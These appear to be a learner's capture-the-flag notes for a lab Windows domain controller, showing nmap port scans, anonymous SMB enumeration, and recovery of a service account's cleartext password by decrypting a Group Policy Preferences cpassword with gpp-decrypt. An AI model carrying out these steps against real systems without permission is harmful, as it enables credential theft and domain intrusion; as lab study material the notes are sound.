##### nmap

All port scan
```bash
sudo nmap -sV -p- 10.10.10.100 -v -oA nmap2
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49166/tcp open  unknown
```

Service scan
```bash
sudo nmap -sC -sV 10.10.10.100 -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49155,49157,49166 -v -oA nmap
```
```
```
##### manual

- SMB share allows anonymous login
![[Pasted image 20240910184958.png]]
```bash
smbclient -N -L \\10.10.10.100
```
- Under the directory `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\` found a file `Groups.xml` that contains a password for `active\SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ` 
- Cracked the password using `gpp-decrypt`
```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```
`active.htb\SVC_TGS:GPPstillStandingStrong2k18`
